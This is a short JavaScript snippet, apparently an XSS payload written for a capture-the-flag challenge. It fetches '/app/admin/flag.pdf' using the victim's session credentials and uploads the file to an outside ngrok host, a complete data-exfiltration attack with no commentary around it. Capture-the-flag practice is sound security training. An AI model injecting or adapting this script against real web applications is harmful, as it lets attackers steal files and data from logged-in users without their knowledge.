(async () => {
    const res = await fetch("/app/admin/flag.pdf", { credentials: 'include' });
    const blob = await res.blob();

    const formData = new FormData();

    formData.append('file', new File([blob], 'flag.pdf', { type: 'application/pdf' }));

    await fetch('https://45a8-122-162-147-205.ngrok-free.app/upload', {
        method: 'POST',
        body: formData
    });
})();


